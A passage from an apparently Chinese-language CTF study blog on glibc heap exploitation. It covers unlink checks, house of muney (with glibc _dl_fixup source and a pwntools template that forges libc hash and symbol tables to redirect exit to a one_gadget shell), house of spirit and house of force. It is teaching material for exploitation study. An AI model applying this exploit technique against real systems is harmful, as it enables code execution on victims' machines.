0))      \</span></span><br><span class="line"><span class="meta">      malloc_printerr (check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);  \</span></span><br><span class="line"><span class="meta">    <span class="keyword">else</span> &#123;      \</span></span><br><span class="line"><span class="meta"><span class="comment">// .....      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">      &#125;      \</span></span></span><br><span class="line"><span class="comment"><span class="meta">&#125;</span></span></span><br></pre></td></tr></table></figure><p>只需要绕过<code>__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0)</code> 即可，因此，不需要伪造地址处于高位的 <code>chunk</code> 的 <code>presize</code> 域。</p><p>高版本的 <code>unlink</code> 的条件是：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list.  */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span></span></span><br><span class="line"><span class="function"><span class="title">unlink_chunk</span> <span class="params">(mstate av, mchunkptr p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">chunksize</span> (p) != <span class="built_in">prev_size</span> (<span class="built_in">next_chunk</span> (p)))  <span class="comment">//new</span></span><br><span class="line">    <span class="built_in">malloc_printerr</span> (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br><span class="line"></span><br><span class="line">  mchunkptr fd = p-&gt;fd;</span><br><span class="line">  mchunkptr bk = p-&gt;bk;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">    <span class="built_in">malloc_printerr</span> (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>新增了 <code>chunksize (p) != prev_size (next_chunk (p))</code>，对 <code>chunksize</code> 有了检查，伪造的时候需要绕过。</p><h3 id="利用效果"><a href="#利用效果" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>构造 <code>chunk overlap</code> 后，可以任意地址分配</li><li>结合其他方法进行任意地址读写</li></ul><h2 id="House-of-muney"><a href="#House-of-muney" class="headerlink" title="House of muney"></a>House of muney</h2><h3 id="利用版本"><a href="#利用版本" class="headerlink" title="利用版本"></a>利用版本</h3><ul><li><code>2.23</code>—— 至今</li></ul><p>这里分析函数延迟绑定机制中写入真实地址的过程</p><p>首先<code>push n;push m;jmp _dl_runtime_resolve_xsavec;</code></p><blockquote><p>n是函数在.rela.plt的位置</p><p>m是codebase</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">=&gt; 0x7ffff7fd8d30 &lt;_dl_runtime_resolve_xsavec&gt;: endbr64</span><br><span class="line">   0x7ffff7fd8d34 &lt;_dl_runtime_resolve_xsavec+4&gt;:       push   rbx</span><br><span class="line">   0x7ffff7fd8d35 &lt;_dl_runtime_resolve_xsavec+5&gt;:       mov    rbx,rsp</span><br><span class="line">   0x7ffff7fd8d38 &lt;_dl_runtime_resolve_xsavec+8&gt;:       and    rsp,0xffffffffffffffc0</span><br><span class="line">   0x7ffff7fd8d3c &lt;_dl_runtime_resolve_xsavec+12&gt;:      sub    rsp,QWORD PTR [rip+0x23f4d]        # 0x7ffff7ffcc90 &lt;_rtld_global_ro+432&gt;</span><br><span class="line">   0x7ffff7fd8d43 &lt;_dl_runtime_resolve_xsavec+19&gt;:      mov    QWORD PTR [rsp],rax</span><br><span class="line">   0x7ffff7fd8d47 &lt;_dl_runtime_resolve_xsavec+23&gt;:      mov    QWORD PTR [rsp+0x8],rcx</span><br><span class="line">   0x7ffff7fd8d4c &lt;_dl_runtime_resolve_xsavec+28&gt;:      mov    QWORD PTR [rsp+0x10],rdx</span><br><span class="line">   0x7ffff7fd8d51 &lt;_dl_runtime_resolve_xsavec+33&gt;:      mov    QWORD PTR [rsp+0x18],rsi</span><br><span class="line">   0x7ffff7fd8d56 &lt;_dl_runtime_resolve_xsavec+38&gt;:      mov    QWORD PTR [rsp+0x20],rdi</span><br><span class="line">   0x7ffff7fd8d5b &lt;_dl_runtime_resolve_xsavec+43&gt;:      mov    QWORD PTR [rsp+0x28],r8</span><br><span class="line">   0x7ffff7fd8d60 &lt;_dl_runtime_resolve_xsavec+48&gt;:      mov    QWORD PTR [rsp+0x30],r9</span><br><span class="line">   0x7ffff7fd8d65 &lt;_dl_runtime_resolve_xsavec+53&gt;:      mov    eax,0xee</span><br><span class="line">   0x7ffff7fd8d6a &lt;_dl_runtime_resolve_xsavec+58&gt;:      xor    edx,edx</span><br><span class="line">   0x7ffff7fd8d6c &lt;_dl_runtime_resolve_xsavec+60&gt;:      mov    QWORD PTR [rsp+0x250],rdx</span><br><span class="line">   0x7ffff7fd8d74 &lt;_dl_runtime_resolve_xsavec+68&gt;:      mov    QWORD PTR [rsp+0x258],rdx</span><br><span class="line">   0x7ffff7fd8d7c &lt;_dl_runtime_resolve_xsavec+76&gt;:      mov    QWORD PTR [rsp+0x260],rdx</span><br><span class="line">   0x7ffff7fd8d84 &lt;_dl_runtime_resolve_xsavec+84&gt;:      mov    QWORD PTR [rsp+0x268],rdx</span><br><span class="line">   0x7ffff7fd8d8c &lt;_dl_runtime_resolve_xsavec+92&gt;:      mov    QWORD PTR [rsp+0x270],rdx</span><br><span class="line">   0x7ffff7fd8d94 &lt;_dl_runtime_resolve_xsavec+100&gt;:     mov    QWORD PTR [rsp+0x278],rdx</span><br><span class="line">   0x7ffff7fd8d9c &lt;_dl_runtime_resolve_xsavec+108&gt;:     xsavec [rsp+0x40]</span><br><span class="line">   0x7ffff7fd8da1 &lt;_dl_runtime_resolve_xsavec+113&gt;:     mov    rsi,QWORD PTR [rbx+0x10]</span><br><span class="line">   0x7ffff7fd8da5 &lt;_dl_runtime_resolve_xsavec+117&gt;:     mov    rdi,QWORD PTR [rbx+0x8]</span><br><span class="line">   0x7ffff7fd8da9 &lt;_dl_runtime_resolve_xsavec+121&gt;:     call   0x7ffff7fd5e70 &lt;_dl_fixup&gt;</span><br><span class="line">   0x7ffff7fd8dae &lt;_dl_runtime_resolve_xsavec+126&gt;:     mov    r11,rax</span><br><span class="line">   0x7ffff7fd8db1 &lt;_dl_runtime_resolve_xsavec+129&gt;:     mov    eax,0xee</span><br><span class="line">   0x7ffff7fd8db6 &lt;_dl_runtime_resolve_xsavec+134&gt;:     xor    edx,edx</span><br><span class="line">   0x7ffff7fd8db8 &lt;_dl_runtime_resolve_xsavec+136&gt;:     xrstor [rsp+0x40]</span><br><span class="line">   0x7ffff7fd8dbd &lt;_dl_runtime_resolve_xsavec+141&gt;:     mov    r9,QWORD PTR [rsp+0x30]</span><br><span class="line">   0x7ffff7fd8dc2 &lt;_dl_runtime_resolve_xsavec+146&gt;:     mov    r8,QWORD PTR [rsp+0x28]</span><br><span class="line">   0x7ffff7fd8dc7 &lt;_dl_runtime_resolve_xsavec+151&gt;:     mov    rdi,QWORD PTR [rsp+0x20]</span><br><span class="line">   0x7ffff7fd8dcc &lt;_dl_runtime_resolve_xsavec+156&gt;:     mov    rsi,QWORD PTR [rsp+0x18]</span><br><span class="line">   0x7ffff7fd8dd1 &lt;_dl_runtime_resolve_xsavec+161&gt;:     mov    rdx,QWORD PTR [rsp+0x10]</span><br><span class="line">   0x7ffff7fd8dd6 &lt;_dl_runtime_resolve_xsavec+166&gt;:     mov    rcx,QWORD PTR [rsp+0x8]</span><br><span class="line">   0x7ffff7fd8ddb &lt;_dl_runtime_resolve_xsavec+171&gt;:     mov    rax,QWORD PTR [rsp]</span><br><span class="line">   0x7ffff7fd8ddf &lt;_dl_runtime_resolve_xsavec+175&gt;:     mov    rsp,rbx</span><br><span class="line">   0x7ffff7fd8de2 &lt;_dl_runtime_resolve_xsavec+178&gt;:     mov    rbx,QWORD PTR [rsp]</span><br><span class="line">   0x7ffff7fd8de6 &lt;_dl_runtime_resolve_xsavec+182&gt;:     add    rsp,0x18</span><br><span class="line">   0x7ffff7fd8dea &lt;_dl_runtime_resolve_xsavec+186&gt;:     jmp    r11</span><br></pre></td></tr></table></figure><p>保存工作状态，然后<code>jmp r11，即jmp _dl_fixup</code></p><p>一下分析<code>_dl_fixup</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* This function is called through a special trampoline from the PLT the</span></span><br><span class="line"><span class="comment">   first time each PLT entry is called.  We must perform the relocation</span></span><br><span class="line"><span class="comment">   specified in the PLT of the given shared object, and return the resolved</span></span><br><span class="line"><span class="comment">   function address to the trampoline, which will restart the original call</span></span><br><span class="line"><span class="comment">   to that address.  Future calls will bounce directly from the PLT to the</span></span><br><span class="line"><span class="comment">   function.  */</span></span><br><span class="line"></span><br><span class="line">DL_FIXUP_VALUE_TYPE</span><br><span class="line">attribute_hidden __attribute ((noinline)) ARCH_FIXUP_ATTRIBUTE</span><br><span class="line">_dl_fixup (</span><br><span class="line"><span class="meta"># <span class="keyword">ifdef</span> ELF_MACHINE_RUNTIME_FIXUP_ARGS</span></span><br><span class="line">   ELF_MACHINE_RUNTIME_FIXUP_ARGS,</span><br><span class="line"><span class="meta"># <span class="keyword">endif</span></span></span><br><span class="line">   <span class="keyword">struct</span> link_map *l, <span class="built_in">ElfW</span>(Word) reloc_arg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// 这里的l是二进制程序本身的link_map，而不是so的</span></span><br><span class="line">  <span class="comment">// 第一个参数是上面的m，即codebase，第二个参数是上述的n，即.rela.plt的偏移</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">// 首先根据link_map中记录的信息，找到动态链接相关的符号表和字符串表</span></span><br><span class="line">  <span class="function"><span class="type">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *<span class="type">const</span> symtab</span></span><br><span class="line"><span class="function">    </span>= (<span class="type">const</span> <span class="type">void</span> *) <span class="built_in">D_PTR</span> (l, l_info[DT_SYMTAB]);</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *strtab = (<span class="type">const</span> <span class="type">void</span> *) <span class="built_in">D_PTR</span> (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 找到对应的重定位元素、符号表、字符串</span></span><br><span class="line">  <span class="type">const</span> PLTREL *<span class="type">const</span> reloc</span><br><span class="line">    = (<span class="type">const</span> <span class="type">void</span> *) (<span class="built_in">D_PTR</span> (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line">  <span class="function"><span class="type">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[<span class="built_in">ELFW</span>(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  <span class="function"><span class="type">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *refsym </span>= sym;</span><br><span class="line">  <span class="comment">// rel_addr 即为got表的地址，在查找到符号真实地址之后会回填到这个地址中</span></span><br><span class="line">  <span class="type">void</span> *<span class="type">const</span> rel_addr = (<span class="type">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="type">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we&#x27;re really looking at a PLT relocation.  */</span></span><br><span class="line">  <span class="built_in">assert</span> (<span class="built_in">ELFW</span>(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don&#x27;t look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (<span class="built_in">ELFW</span>(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">r_found_version</span> *version = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[<span class="built_in">VERSYMIDX</span> (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="type">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">    (<span class="type">const</span> <span class="type">void</span> *) <span class="built_in">D_PTR</span> (l, l_info[<span class="built_in">VERSYMIDX</span> (DT_VERSYM)]);</span><br><span class="line">  <span class="built_in">ElfW</span>(Half) ndx = vernum[<span class="built_in">ELFW</span>(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment"> not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment"> we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="type">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">THREAD_GSCOPE_SET_FLAG</span> ();</span><br><span class="line">  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="comment">// 第一个参数是字符串地址，根据符号表和字符串表得到的</span></span><br><span class="line"><span class="comment">// 第二个参数是link_map</span></span><br><span class="line"><span class="comment">// 第三个参数是符号表的地址，是一个栈地址，最后会修正得到的符号表</span></span><br><span class="line"><span class="comment">// 第四个参数是scope，表示查找的范围</span></span><br><span class="line"><span class="comment">// 第五个参数是版本信息</span></span><br><span class="line"><span class="comment">// 后面的参数都是固定的</span></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line"><span class="built_in">THREAD_GSCOPE_RESET_FLAG</span> ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment"> of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment"> offset.  */</span></span><br><span class="line">      value = <span class="built_in">DL_FIXUP_MAKE_VALUE</span> (result,</span><br><span class="line">   <span class="built_in">SYMBOL_ADDRESS</span> (result, sym, <span class="literal">false</span>));</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment"> address) is also known.  */</span></span><br><span class="line">      value = <span class="built_in">DL_FIXUP_MAKE_VALUE</span> (l, <span class="built_in">SYMBOL_ADDRESS</span> (l, sym, <span class="literal">true</span>));</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = <span class="built_in">elf_machine_plt_value</span> (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; __builtin_expect (<span class="built_in">ELFW</span>(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = <span class="built_in">elf_ifunc_invoke</span> (<span class="built_in">DL_FIXUP_VALUE_ADDR</span> (value));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (<span class="built_in">GLRO</span>(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line"><span class="comment">// 修正got表条目</span></span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">elf_machine_fixup_plt</span> (l, result, refsym, sym, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只了解了大概流程</p><h3 id="利用过程"><a href="#利用过程" class="headerlink" title="利用过程"></a>利用过程</h3><p><code>ptmalloc</code> 堆分配器在分配超大内存 <code>&gt; 128K</code> 的时候，会调用 <code>mmap</code> 申请系统内存，此时申请到的内存一般位于 <code>libc.so.6</code> 映射的内存地址的低地址处。<code>house of muney</code> 的核心在于修改 <code>mmap</code> 内存的 <code>size</code> 大小，使其能把 <code>libc.so.6</code> 的符号表、哈希表等数据所在的地址空间也释放掉。然后再把这一片空间给申请回来，就能伪造符号表、哈希表，那么在解析函数实际地址的时候就能控制其解析为任意地址，进而控制程序执行流。</p><ol><li><code>A = mmap(addr=NULL, length=0x1000,...)</code></li><li>修改 <code>A</code> 的 <code>size</code>，为 <code>0x1000 + XXX</code></li><li><code>free(A)</code>，实际执行的是：<code>munmap(A, 0x1000 + XXX)</code>，就可以偷取 <code>glibc</code> 的内存</li><li><code>mmap(addr=NULL, length=0x1000 + XXX, ... )</code>，然后输入数据，就可以控制 “偷去” 的内存的内容</li><li>在进行符号解析的时候，进行任意函数调用</li></ol><p>需要伪造的结构有：</p><ol><li><strong>bitmask_word</strong></li><li><strong>bucket</strong></li><li><strong>hasharr</strong>，需要多伪造几个，并不是第一个就满足条件</li><li><strong>target symbol -&gt;st_value</strong>，符号表中，除了st_value修改为目标地址外，其他成员建议保持不变</li></ol><p>简单来说，就是伪造符号表，让初次调用funcA时的真实地址，解析成funcB达到任意代码执行的效果</p><p>给出模板</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0</span>, <span class="number">0x40000</span> - <span class="number">0x2000</span>)   </span><br><span class="line">dbg()</span><br><span class="line">edit(<span class="number">0</span>, -<span class="number">8</span>, p64(<span class="number">0x41002</span> + <span class="number">0x5000</span> + <span class="number">0x4000</span>))  <span class="comment">#修改size，以让mmap可以申请到libc段上的空间（malloc过大的chunk会重新申请一个段来存储chunk，该段与libc接近）</span></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x41000</span> * <span class="number">2</span> + <span class="number">0x4000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 2: Prepare offsets and gadgets</span></span><br><span class="line">base_off = <span class="number">0x7dff0</span>                           <span class="comment">#mmap段与libc_base的差值</span></span><br><span class="line">one_gadget = [<span class="number">0xe3afe</span>, <span class="number">0xe3b01</span>, <span class="number">0xe3b04</span>][<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">gnu_hash_section = libc.get_section_by_name(<span class="string">&#x27;.gnu.hash&#x27;</span>)</span><br><span class="line">dynsym_section = libc.get_section_by_name(<span class="string">&#x27;.dynsym&#x27;</span>)</span><br><span class="line">dynstr_section = libc.get_section_by_name(<span class="string">&#x27;.dynstr&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Calculate hash and offsets</span></span><br><span class="line">namehash = gnu_hash_section.gnu_hash(<span class="string">&#x27;exit&#x27;</span>)</span><br><span class="line">bloom_off = gnu_hash_section[<span class="string">&#x27;sh_addr&#x27;</span>] + <span class="number">4</span> * gnu_hash_section._wordsize</span><br><span class="line">bucket_off = bloom_off + gnu_hash_section.params[<span class="string">&#x27;bloom_size&#x27;</span>] * gnu_hash_section._xwordsize</span><br><span class="line"></span><br><span class="line">bloom_elem_idx = <span class="built_in">int</span>(namehash / gnu_hash_section.elffile.elfclass) % gnu_hash_section.params[<span class="string">&#x27;bloom_size&#x27;</span>]</span><br><span class="line">bloom_elem_off = bloom_off + bloom_elem_idx * gnu_hash_section._xwordsize</span><br><span class="line">bloom_elem_val = gnu_hash_section.params[<span class="string">&#x27;bloom&#x27;</span>][bloom_elem_idx]</span><br><span class="line"></span><br><span class="line">bucket_elem_idx = namehash % gnu_hash_section.params[<span class="string">&#x27;nbuckets&#x27;</span>]</span><br><span class="line">bucket_elem_off = bucket_off + bucket_elem_idx * gnu_hash_section._wordsize</span><br><span class="line">bucket_elem_val = gnu_hash_section.params[<span class="string">&#x27;buckets&#x27;</span>][bucket_elem_idx]</span><br><span class="line"></span><br><span class="line">hasharr_off = gnu_hash_section._chain_pos + (bucket_elem_val - gnu_hash_section.params[<span class="string">&#x27;symoffset&#x27;</span>]) * gnu_hash_section._wordsize</span><br><span class="line">sym_off = dynsym_section[<span class="string">&#x27;sh_offset&#x27;</span>] + bucket_elem_val * dynsym_section[<span class="string">&#x27;sh_entsize&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 4: Prepare the new symbol entry for `exit`</span></span><br><span class="line">sym_value = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">sym_value += p32(libc.search(<span class="string">b&#x27;exit\x00&#x27;</span>).__next__() - dynstr_section[<span class="string">&#x27;sh_offset&#x27;</span>])  <span class="comment"># st_name </span></span><br><span class="line">sym_value += p8(<span class="number">0x12</span>)  <span class="comment"># st_info</span></span><br><span class="line">sym_value += p8(<span class="number">0</span>)  <span class="comment"># st_other</span></span><br><span class="line">sym_value += p16(<span class="number">1</span>)  <span class="comment"># st_shndx</span></span><br><span class="line">sym_value += p64(one_gadget)  <span class="comment"># st_value  #目标地址----------------------</span></span><br><span class="line">sym_value += p64(<span class="number">8</span>)  <span class="comment"># st_size</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 5: Edit the heap to overwrite the hash table and symbol table</span></span><br><span class="line">edit(<span class="number">0</span>, base_off + bloom_elem_off, p64(bloom_elem_val))</span><br><span class="line">edit(<span class="number">0</span>, base_off + bucket_elem_off, p32(bucket_elem_val))</span><br><span class="line">edit(<span class="number">0</span>, base_off + hasharr_off, p32(namehash))</span><br><span class="line">edit(<span class="number">0</span>, base_off + sym_off, sym_value)</span><br><span class="line">dbg()</span><br><span class="line"><span class="comment"># Step 6: Trigger the exploit</span></span><br><span class="line">io.sendlineafter(<span class="string">b&quot;option:&quot;</span>, <span class="string">b&quot;5&quot;</span>)   <span class="comment">#首次调用exit函数</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="house-of-spirit"><a href="#house-of-spirit" class="headerlink" title="house of spirit"></a>house of spirit</h2><h3 id="漏洞成因-1"><a href="#漏洞成因-1" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出写</p><h3 id="适用范围-1"><a href="#适用范围-1" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li></ul><h3 id="利用原理-1"><a href="#利用原理-1" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用堆溢出，修改 <code>chunk size</code>，伪造出 <code>fake chunk</code>，然后通过堆的释放和排布，控制 <code>fake chunk</code>。<code>house of spirit</code> 的操作思路有很多，比如可以按如下操作进行利用：</p><ul><li>申请 <code>chunk A、chunk B、chunk C、chunk D</code></li><li>对 <code>A</code> 写操作的时候溢出，修改 <code>B</code> 的 <code>size</code> 域，使其能包括 <code>chunk C</code></li><li>释放 <code>B</code>，然后把 <code>B</code> 申请回来，再释放 <code>C</code>，则可以通过读写 <code>B</code> 来控制 <code>C</code> 的内容</li></ul><h3 id="相关技巧-1"><a href="#相关技巧-1" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>起初 <code>house of spirit</code> 主要是针对 <code>fastbin</code>，后来引入了 <code>tcachebin</code> 后，也可以使用 <code>tcachebin</code> 版本的 <code>house of spirit</code>。利用方法与 <code>fastbin</code> 场景下类似，注意好不同版本下的检查条件即可。</p><h3 id="利用效果-1"><a href="#利用效果-1" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>劫持 <code>fastbin/tcachebin</code> 的 <code>fd</code> 之后，可以任意地址分配、任意地址读写</li></ul><h2 id="house-of-force"><a href="#house-of-force" class="headerlink" title="house of force"></a>house of force</h2><h3 id="漏洞成因-2"><a href="#漏洞成因-2" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出写 <code>top_chunk</code></p><h3 id="适用范围-2"><a href="#适用范围-2" class="headerlink" 